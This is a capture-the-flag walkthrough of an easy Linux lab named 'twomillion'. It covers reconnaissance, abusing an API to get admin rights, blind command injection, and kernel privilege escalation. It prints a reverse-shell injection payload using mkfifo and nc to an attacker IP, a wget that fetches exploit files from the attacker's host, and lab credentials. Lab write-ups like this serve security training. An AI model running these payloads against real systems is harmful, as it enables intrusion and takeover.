lab name: twomillion
difficulty : easy
Target: linux

# nmap

```
╰─❯ nmap -sV 10.10.11.221
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 07:56 EEST
Nmap scan report for 10.10.11.221
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.25 seconds
```

in this nmap scan it indicates http server is opened but we need to put 2million.htb in /etc/hosts

# find me

after going to the home of the website you will notice that its
web application that has login functionality. when you go to join endpoint you will notice you need invite code.

![alt text](<../images/Screenshot 2025-06-07 at 8.15.33 AM.png>)

turn on burpsuite and refresh you will notice that endpoint

![alt text](<../images/Screenshot 2025-06-07 at 8.18.17 AM.png>)
its a obsfucated javascript code. when you deobsfucate it you will understand what does it to

https://matthewfl.com/unPacker.html => this is an unpacker for js

the output

```
function verifyInviteCode(code)
	{
	var formData=
		{
		"code":code
	};
	$.ajax(
		{
		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
function makeInviteCode()
	{
	$.ajax(
		{
		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
			{
			console.log(response)
		}
		,error:function(response)
			{
			console.log(response)
		}
	}
	)
}
```

/api/v1/invite/how/to/generate this endpoint is interesting. lets go for it

![alt text](<../images/Screenshot 2025-06-07 at 8.22.48 AM.png>)

theres a text that is encrypted in ROT-13
decrypt it and it says

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

send a POST request to this endpoint

![alt text](<../images/Screenshot 2025-06-07 at 8.25.22 AM.png>)
invite code got generated! but base64 decrypt it first and make an account

## investigating the API

when you go through the vpn generate using burpsuite you will notice this API
/api/v1/generate/vpn
try to get to /api/v1 you will notice the whole documentation

![alt text](<../images/Screenshot 2025-06-07 at 8.36.43 AM.png>)
going to the update admin endpoint

![alt text](<../images/Screenshot 2025-06-07 at 8.37.34 AM.png>)

put the content-type header to application/json
and it will tell you put the email in the json body

![alt text](<../images/Screenshot 2025-06-07 at 8.39.09 AM.png>)

now go the api endpoint then go to the generation of vpn for admin user
make a POST request with username

## blind command injection
when you send in username "test &&" you will see empty response. try "test && whoami" and you will still see empty response. open a python http server and try curl to your own ip maybe it will work

![alt text](<../images/Screenshot 2025-06-07 at 8.46.14 AM.png>)

this payload in username parameter will work but you need to open netcat in your machine first

```
test && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 9001 >/tmp/f
```

dont forget to replace ip and port

# going in

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

for better bash experience

now do ls -la and you will see that theres an .env file

```
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

go to ssh using those credintials

now you have the user flag

after some spidering you will find /var/mail

```
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather


```

in the mail it says overlayFS / FUSE

search for the cve
https://github.com/puckiestyle/CVE-2023-0386

git clone the cve file then run python http server on it then run this command to get the file in the target machine

```

wget -r --no-parent http://10.10.16.4:8000/CVE-2023-0386

```

then follow the github instructions and now you have a shell
